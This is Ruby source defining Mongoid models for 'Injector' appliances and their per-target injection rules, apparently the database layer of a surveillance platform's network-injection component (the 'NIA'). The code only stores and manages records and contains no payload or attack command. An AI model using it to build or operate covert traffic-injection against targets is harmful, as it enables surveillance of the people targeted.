require 'mongoid'
require 'tempfile'
require 'zip/zip'
require 'zip/zipfilesystem'

#module RCS
#module DB

class Injector
  include RCS::Tracer
  include Mongoid::Document
  include Mongoid::Timestamps

  field :name, type: String
  field :desc, type: String
  field :address, type: String
  field :redirect, type: String
  field :port, type: Integer
  field :poll, type: Boolean
  field :version, type: Integer
  field :configured, type: Boolean, default: false
  field :upgradable, type: Boolean, default: false
  field :redirection_tag, type: String

  # this is the binary config
  field :_grid, type: Array
  field :_grid_size, type: Integer

  index :name
  index :address
  index :poll
  index :configured

  store_in :injectors

  embeds_many :rules, class_name: "InjectorRule"

  after_destroy :destroy_callback

  protected
  def destroy_callback
    Mongoid.database.drop_collection CappedLog.collection_name(self._id.to_s)
    # make sure to delete the binary config in the grid
    RCS::DB::GridFS.delete self[:_grid].first unless self[:_grid].nil?
  end

  public
  def delete_rule_by_item(id)
    self.rules.each do |rule|
      if rule.target_id.include? id
        trace :debug, "Deleting Rule because it contains #{id}"
        rule.destroy
      end
    end
  end

  def disable_on_sync(factory)
    modified = false
    self.rules.each do |rule|
      if rule.disable_sync and rule.action_param == factory[:_id].to_s
        trace :info, "Disabling rule by sync of #{factory.name}"
        rule.enabled = false
        rule.save
        modified = true
      end
    end

    # push the rules to the NIA
    RCS::DB::InjectorTask.new('injector', nil, {'injector_id' => self[:_id]}).run if modified
  end

end


class InjectorRule
  include Mongoid::Document
  include Mongoid::Timestamps

  field :enabled, type: Boolean
  field :disable_sync, type: Boolean
  field :probability, type: Integer

  field :target_id, type: Array
  field :ident, type: String
  field :ident_param, type: String
  field :resource, type: String
  field :action, type: String
  field :action_param, type: String
  field :action_param_name, type: String

  field :_grid, type: Array

  embedded_in :injector

  after_destroy :destroy_callback

  protected

  def destroy_callback
    RCS::DB::GridFS.delete self[:_grid].first unless self[:_grid].nil?
  end
end

#end # ::DB
#end # ::RCS